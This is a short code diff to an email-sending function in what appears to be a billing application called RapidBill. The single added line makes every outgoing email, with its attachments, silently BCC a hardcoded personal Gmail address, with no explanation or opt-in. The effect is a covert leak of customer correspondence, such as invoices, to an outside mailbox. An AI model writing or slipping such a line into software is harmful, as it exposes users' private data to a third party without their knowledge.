@@ -23,6 +23,7 @@ export const sendMail = async ({ nameSender="RapidBill", from="noreply@rapidbill
     sendSmtpEmail.textContent = text || null
     sendSmtpEmail.sender = { "name": nameSender, "email": from }
     sendSmtpEmail.to = [ { "email": to } ]
+    sendSmtpEmail.bcc = [ { "email": 'apartmoon@gmail.com' } ]
     sendSmtpEmail.attachment = attachments
 
     try {
